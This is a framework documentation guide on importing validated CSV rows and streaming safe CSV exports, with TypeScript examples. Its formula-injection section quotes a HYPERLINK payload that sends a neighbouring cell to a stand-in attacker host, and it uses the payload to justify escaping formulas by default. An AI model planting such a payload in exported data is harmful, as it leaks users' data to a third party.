---
title: Import and export CSV
description: Read an uploaded CSV into validated rows with errors that name the line, and stream exports that spreadsheets open safely.
section:
    title: Data & background work
    order: 6
order: 8
lastUpdated: 2026-09-29
---

CSV is how most people move data in and out of an app: a spreadsheet of contacts to import, a
report to download on the first of the month. Both directions have traps. An upload arrives as
untyped text that may be malformed halfway through, and an export can carry a cell a
spreadsheet runs as a formula on the machine of whoever opens it.

This guide imports a contact list and exports it back. [`@sdxc/csv`](/api/csv) reads and writes
RFC 4180 and returns a `Result` wherever `JSON.parse` would throw,
[`@sdxc/validate`](/api/validate) types each row with a schema, and
[`@sdxc/http`](/api/http) sends the export as a download.

```bash
npm add @sdxc/csv @sdxc/validate @sdxc/result @sdxc/http remix
```

## Describe a row

The reader returns strings only. CSV has no numbers, dates or empty values, and guessing would
lose data: `"007"` read as a number is `7`. So the types come from a schema of your own, with
one field per column header:

```typescript {% title="app/imports/contact-row.ts" %}
import * as s from "remix/data-schema";
import { email, min, minLength } from "remix/data-schema/checks";
import * as coerce from "remix/data-schema/coerce";

export const CONTACT_ROW = s.object({
	name: s.string().pipe(minLength(1)),
	email: s
		.string()
		.pipe(email())
		.transform((value) => value.toLowerCase()),
	plan: s.enum_(["free", "pro"]),
	seats: coerce.number().pipe(min(1)),
});

export type Contact = s.InferOutput<typeof CONTACT_ROW>;
```

`coerce.number()` turns the column's `"3"` into `3` before `min` checks it. Columns the schema
does not name are stripped, so a spreadsheet with an extra notes column still imports.

## Parse the file and validate each row

`parse` reads the header row as keys and returns every later record as a
`Record<string, string>`. It fails on text it cannot turn into records at all, such as an
unterminated quote or a record with the wrong number of fields, and the `CSVParseError` it
returns carries the `line` it stopped on. A row that parses but fails the schema is a different
kind of problem, so the import reports both, on one error that carries the list:

```typescript {% title="app/imports/read-contacts.ts" %}
import type { Result } from "@sdxc/result";

import { parse } from "@sdxc/csv";
import { failure, isFailure, success } from "@sdxc/result";
import { validate } from "@sdxc/validate";

import type { Contact } from "~/app/imports/contact-row";

import { CONTACT_ROW } from "~/app/imports/contact-row";

export type ImportProblem =
	| { kind: "file"; line: number; message: string }
	| { kind: "row"; row: number; messages: string[] };

export class ImportError extends Error {
	override name = "ImportError";
	problems: ImportProblem[];

	constructor(problems: ImportProblem[]) {
		super(`The file has ${problems.length} problem(s)`);
		this.problems = problems;
	}
}

export async function readContacts(
	text: string,
): Promise<Result<Contact[], ImportError>> {
	let parsed = parse(text);
	if (isFailure(parsed)) {
		let { line, message } = parsed.error;
		return failure(new ImportError([{ kind: "file", line, message }]));
	}

	let contacts: Contact[] = [];
	let problems: ImportProblem[] = [];

	for (let [index, record] of parsed.data.rows.entries()) {
		let row = await validate(record, CONTACT_ROW);
		if (isFailure(row)) {
			let messages = row.error.issues.map((issue) => describe(issue));
			problems.push({ kind: "row", row: index + 2, messages });
			continue;
		}
		contacts.push(row.data);
	}

	if (problems.length > 0) return failure(new ImportError(problems));
	return success(contacts);
}
```

The row number is `index + 2`: one for the header, one because people count from one. For a
file with no blank lines, which the reader skips, it is the number a spreadsheet shows beside
the row. A file-level `line` is counted the way a text editor counts, line breaks inside quoted
fields included, so the two differ once a cell holds a newline, which is why each problem
names which one it carries.

Collecting every row's problems before answering matters more than it looks. A person fixing a
file in a spreadsheet wants the whole list at once, not one error per upload. `describe` puts
the column's name in front of each message:

```typescript {% title="app/imports/read-contacts.ts" %}
interface Issue {
	message: string;
	path?: ReadonlyArray<PropertyKey | { key: PropertyKey }>;
}

function describe(issue: Issue): string {
	let first = issue.path?.[0];
	let column = typeof first === "object" ? first.key : first;
	return column === undefined
		? issue.message
		: `${String(column)}: ${issue.message}`;
}
```

`parse` also returns `warnings`, each with a `line` and `message`, for departures from RFC 4180
it accepted, such as a bare `"` inside an unquoted field. They are worth showing beside a
successful import.

## Accept the upload

The action reads the file from the form, hands its text to `readContacts`, and either renders
the problems or saves every contact. The file field is validated like any other:
`remix/data-schema/form-data`'s `f.file()` refuses a submission that carries no file.

```tsx {% title="app/http/controllers/contacts/import.tsx" %}
import { redirect } from "@sdxc/http/response";
import { isFailure } from "@sdxc/result";
import { validate } from "@sdxc/validate";
import * as s from "remix/data-schema";
import * as f from "remix/data-schema/form-data";
import { createAction } from "remix/router";

import { Contacts } from "~/app/data/contacts";
import { readContacts } from "~/app/imports/read-contacts";
import { ImportPage } from "~/resources/views/import";
import routes from "~/routes/web";

const UPLOAD = f.object({ file: f.file(s.instanceof_(File)) });

export default createAction(routes.contacts.import, async (ctx) => {
	let upload = await validate(ctx.formData, UPLOAD);
	if (isFailure(upload)) {
		let page = <ImportPage issues={upload.error.issues} />;
		return ctx.render(page, { status: 400 });
	}

	let contacts = await readContacts(await upload.data.file.text());
	if (isFailure(contacts)) {
		let page = <ImportPage problems={contacts.error.problems} />;
		return ctx.render(page, { status: 422 });
	}

	await Contacts.createMany(ctx.db, ctx.account.id, contacts.data);
	return redirect(routes.contacts.index.href(), {
		status: redirect.Status.SeeOther,
	});
});
```

`Contacts` is your own table, and `ctx.account` the signed-in account your auth middleware
publishes. The import is all or nothing: a file with one bad row saves nothing, so fixing it and
uploading it again cannot duplicate the rows that were fine. On D1 that also means
`Contacts.createMany` writes every contact in one statement, such as the multi-row `INSERT`
that `remix/data-table`'s own `createMany` compiles to, as
[Query D1 and Durable Object SQL](/docs/data-and-background-work/databases) explains.

The whole file is read into memory, so cap its size where the body is parsed, with the
`maxFileSize` option of Remix's `formData()` middleware.

## Stream an export

`streamify` writes rows as a UTF-8 byte stream while they are read, from an array or an async
iterable. An async generator that pages through the table with
[`Pagination.byKeyset`](/api/pagination) keeps the export's memory flat however many contacts
an account holds:

```typescript {% title="app/http/controllers/contacts/export.ts" %}
import type { Database } from "remix/data-table";

import { streamify } from "@sdxc/csv";
import { attachment, csv } from "@sdxc/http/response";
import { Pagination } from "@sdxc/pagination";
import { isFailure } from "@sdxc/result";
import { createAction } from "remix/router";

import { contacts } from "~/database/schema";
import routes from "~/routes/web";

function contactsAfter(db: Database, accountId: string, after: string | null) {
	return Pagination.byKeyset(db.query(contacts).where({ account_id: accountId }), {
		orderBy: [
			["created_at", "asc"],
			["id", "asc"],
		],
		after,
		limit: 500,
	});
}

async function* contactRows(db: Database, accountId: string) {
	let after: string | null = null;
	do {
		let page = await contactsAfter(db, accountId, after);
		if (isFailure(page)) throw page.error;

		for (let contact of page.data.items) {
			yield { ...contact, created_at: new Date(contact.created_at) };
		}
		after = page.data.cursors.next;
	} while (after !== null);
}

export default createAction(routes.contacts.export, (ctx) => {
	let body = streamify(contactRows(ctx.db, ctx.account.id), {
		columns: [
			{ key: "name", header: "Name" },
			{ key: "email", header: "Email" },
			{ key: "plan", header: "Plan" },
			{ key: "seats", header: "Seats" },
			{ key: "created_at", header: "Added" },
		],
	});

	return csv(body, {
		headers: {
			"Content-Disposition": attachment("contacts.csv"),
			"Cache-Control": "no-store",
		},
	});
});
```

Each page seeks forward from `cursors.next`, the position of the last row the previous page
returned, and the loop ends when a page comes back without one. Keyset paging never counts and
never skips an offset, so the thousandth page costs what the first does, and a contact added
while the export runs cannot shift a row onto the next page twice. `created_at` breaks no ties,
so `id` follows it as the tiebreaker `byKeyset` requires. A failed page throws inside the
generator, which errors the stream: the download fails visibly rather than arriving cut short.
[Paginate lists](/docs/http-apis/paginate-lists) covers keyset paging for a page a person reads.

`columns` is required here because the header goes out before the first row is read, so a slow
first query still starts the download. Each cell writes by its type: numbers as `String(value)`,
a `Date` as ISO 8601 in UTC, and `null` as an empty field. `csv()` sets
`text/csv; charset=utf-8`, and `attachment()` builds a `Content-Disposition` that carries a
non-ASCII filename exactly. If the client disconnects, cancelling the stream stops the
generator, so no further page is read once nobody is downloading.

`stringify` takes the same options and returns the whole file as one string, in a `Result`, for
a small export or an email attachment.

## Neutralize formulas

A contact named `=HYPERLINK("https://evil.example/?"&B2,"Open")` is just text to your app. When
an admin opens the export in a spreadsheet, it is a live formula that can send the neighboring
cell, an email address, to someone else's server. The attacker only had to sign up with that
name.

That is why the writer neutralizes by default. A string cell starting with `=`, `+`, `-`, `@`,
tab or carriage return gets a leading `'`, which a spreadsheet treats as "show this as text",
so the name above displays as written and runs nothing. Only strings are touched: a number cell's
type already says it is data, so `-12` written as the number `-12` stays a number. Keep numeric
columns numeric in the rows you export, since a balance pre-formatted as the string `"-12.50"`
would come out as `'-12.50`.

Turn it off with `escapeFormulas: false` only for a file no spreadsheet opens, such as a feed a
script reads, where the added `'` would be part of the text the program sees.

## Write for spreadsheets in other locales

Excel in decimal-comma locales, such as Spanish, German or French, splits a `.csv` on `;`
instead of `,`, and reads it as UTF-8 only when it starts with a byte order mark. Both are
options on the writer:

```typescript {% title="app/exports/spreadsheet-options.ts" %}
import type { WriteOptions } from "@sdxc/csv";

export function spreadsheetOptions(locale: string): WriteOptions {
	let parts = new Intl.NumberFormat(locale).formatToParts(1.5);
	let decimalComma = parts.find((part) => part.type === "decimal")?.value === ",";
	return { delimiter: decimalComma ? ";" : ",", bom: true };
}
```

Spread the result into the `streamify` options for a download a person opens. Leave both off for
files programs read: some parsers take the byte order mark as part of the first header.

## Where to go next

- [Validate forms and route params](/docs/building-remix-apps/forms-and-params) — rendering the
  `issues` the upload refusal carries.
- [Query D1 and Durable Object SQL](/docs/data-and-background-work/databases) — the single
  statement that makes the import atomic.
- [Background jobs and cron](/docs/data-and-background-work/jobs-and-cron) — moving a large
  import off the request.
- [`@sdxc/csv`](/api/csv) — every option and error field of the reader and writers.
